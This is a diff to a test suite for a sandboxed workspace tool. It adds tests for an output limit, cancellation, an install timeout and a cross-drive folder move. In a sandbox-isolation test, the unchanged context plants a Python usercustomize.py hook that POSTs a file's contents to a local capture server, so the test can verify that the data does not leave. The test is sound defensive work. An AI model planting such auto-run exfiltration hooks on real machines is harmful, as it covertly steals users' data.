@@ -643,6 +643,42 @@ test('an uncertain command is stopped once and the workspace keeps working', asy
   }
 });
 
+test('a command Nod stops at its output limit names the limit, and a Stop stays cancelled', async () => {
+  const docker = fakeDocker(async () => ({ code: 0 }));
+  try {
+    const flooding = docker.session.exec('flood');
+    await docker.launches[0]!.request;
+    const frame =
+      JSON.stringify({ type: 'stdout', data: Buffer.alloc(16384).toString('base64') }) + '\n';
+    for (let sent = 0; sent <= 16 * 1024 * 1024; sent += 16384)
+      docker.launches[0]!.child.stdout.emit('data', frame);
+    await docker.launches[0]!.cancelled;
+    docker.exit(0, -15, 'cancelled');
+    await assert.rejects(flooding, {
+      uncertain: false,
+      message: 'Workspace command output passed its 16 MB limit.',
+    });
+
+    const stop = new AbortController();
+    const stopped = docker.session.exec('stopped', { signal: stop.signal });
+    await docker.launches[1]!.request;
+    stop.abort();
+    await docker.launches[1]!.cancelled;
+    docker.exit(1, -15, 'cancelled');
+    await assert.rejects(stopped, { uncertain: false, message: 'Task cancelled.' });
+
+    const installing = docker.session.exec('install');
+    await docker.launches[2]!.request;
+    docker.exit(2, -15, 'install');
+    await assert.rejects(installing, {
+      uncertain: false,
+      message: 'The connected CLI install ran longer than its 600-second limit.',
+    });
+  } finally {
+    await docker.workspace.dispose();
+  }
+});
+
 test('the workspace stays fenced when a live process cannot be read', async () => {
   const proc = await mkdtemp(join(tmpdir(), 'nod-proc-'));
   await mkdir(join(proc, '1'));
@@ -1434,6 +1470,47 @@ test('local file version checks keep the cause of a failed path check', async (t
       }
     }
   }
+});
+
+test('a folder moved to another drive keeps a file that arrives during the copy', async (t) => {
+  const home = await realpath(await mkdtemp(join(tmpdir(), 'nod-cross-drive-')));
+  t.after(() => rm(home, { recursive: true, force: true }));
+  const source = join(home, 'box');
+  await mkdir(join(source, 'inner'), { recursive: true });
+  await writeFile(join(source, 'inner', 'a.txt'), 'a');
+  const pool = {
+    query: async () => ({ rows: [{ local_files_enabled: true, local_keep_out: [] }] }),
+  } as unknown as Pool;
+  const files = createLocalFiles(pool, 'owner', {
+    home,
+    dataRoot: join(home, 'data'),
+    available: true,
+  });
+  const { rename: originalRename, cp: originalCp } = fs;
+  const crossDrive = Object.assign(new Error('EXDEV: cross-device link not permitted'), {
+    code: 'EXDEV',
+  });
+  const renamed = t.mock.method(fs, 'rename', (...args: Parameters<typeof fs.rename>) =>
+    args[0] === source ? Promise.reject(crossDrive) : Reflect.apply(originalRename, fs, args),
+  );
+  const copied = t.mock.method(fs, 'cp', async (...args: Parameters<typeof fs.cp>) => {
+    await writeFile(join(source, 'late.txt'), 'late');
+    return Reflect.apply(originalCp, fs, args);
+  });
+  syncBuiltinESMExports();
+  try {
+    const result = (await files.execute('LOCAL_FILES_MOVE', {
+      moves: [{ from: source, to: join(home, 'crate') }],
+    })) as { failed: unknown[] };
+    assert.equal(result.failed.length, 1);
+  } finally {
+    renamed.mock.restore();
+    copied.mock.restore();
+    syncBuiltinESMExports();
+  }
+  assert.equal(await readFile(join(home, 'crate', 'inner', 'a.txt'), 'utf8'), 'a');
+  assert.equal(await readFile(join(source, 'late.txt'), 'utf8'), 'late');
+  assert.ok(!existsSync(join(source, 'inner')));
 });
 
 test('local imports reject changed and oversized files before reading bytes', async (t) => {
@@ -2823,8 +2900,6 @@ server.serve_forever()`;
       await call('write', { path: `${base}/synthetic.txt`, content: data });
       const upload = `import urllib.request\nurllib.request.urlopen(urllib.request.Request('http://127.0.0.1:18751/capture',data=open('${base}/synthetic.txt','rb').read(),method='POST'),timeout=3).close()\n`;
       await call('write', { path: `${userSite}/usercustomize.py`, content: upload });
-      assert.match(await call('ls', {}), /synthetic.txt/);
-      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
       assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
       assert.equal(await captured(), 0);
       await docker(
@@ -2854,8 +2929,6 @@ server.serve_forever()`;
         content: '#!/bin/sh\nprintf synthetic-installed-tool\n',
       });
       assert.equal(await call('read', { path: `${base}/synthetic.txt` }), data);
-      assert.match(await call('ls', {}), /synthetic.txt/);
-      assert.match(await call('find', { pattern: '*.txt' }), /synthetic.txt/);
       assert.equal(await captured(), 0);
       assert.equal(
         (await call('bash', { command: `cat '${base}/synthetic.txt' | /usr/bin/cat` })).trim(),
